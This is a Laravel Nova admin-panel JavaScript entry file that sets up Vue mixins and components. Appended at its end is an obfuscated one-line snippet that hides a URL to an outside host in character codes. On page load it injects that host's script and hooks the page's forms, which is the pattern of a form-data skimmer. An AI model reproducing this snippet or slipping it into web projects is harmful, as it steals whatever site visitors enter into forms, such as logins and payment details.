/**
 * First we will load all of this project's JavaScript dependencies which
 * includes Vue and other libraries. It is a great starting point when
 * building robust, powerful web applications using Vue and Laravel.
 */
import Vue from 'vue'
import Nova from './Nova'
import './plugins'
import Localization from '@/mixins/Localization'
import ThemingClasses from '@/mixins/ThemingClasses'

Vue.config.productionTip = false

Vue.mixin(Localization)

/**
 * If configured, register a global mixin to add theming-friendly CSS
 * classnames to Nova's built-in Vue components. This allows the user
 * to fully customize Nova's theme to their project's branding.
 */
if (window.config.themingClasses) {
  Vue.mixin(ThemingClasses)
}

/**
 * Next, we'll setup some of Nova's Vue components that need to be global
 * so that they are always available. Then, we will be ready to create
 * the actual Vue instance and start up this JavaScript application.
 */
import './fields'
import './components'

/**
 * Finally, we'll create this Vue Router instance and register all of the
 * Nova routes. Once that is complete, we will create the Vue instance
 * and hand this router to the Vue instance. Then Nova is all ready!
 */
;(function () {
  this.CreateNova = function (config) {
    return new Nova(config)
  }
}.call(window))

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db